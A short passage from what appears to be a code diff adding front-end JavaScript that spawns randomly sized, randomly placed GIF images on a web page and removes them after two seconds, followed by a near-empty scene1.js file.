+            const gif = document.createElement('img');
+            gif.src = GIF_URL;
+            gif.className = 'spawned-gif';
+            
+            const size = Math.random() * 120 + 80;
+            gif.style.width = size + 'px';
+            gif.style.height = 'auto';
+            
+            gif.style.left = x + 'px';
+            gif.style.top = y + 'px';
+            
+            document.body.appendChild(gif);
+
+            setTimeout(() => {
+                gif.remove();
+            }, 2000);
+        }
+    </script>
+    <script src="/scene1.js"></script>
+
+</body>
+</html>
+
+---
+./app/web/scene1.js
+---
+// Go to the html 
 
 ---
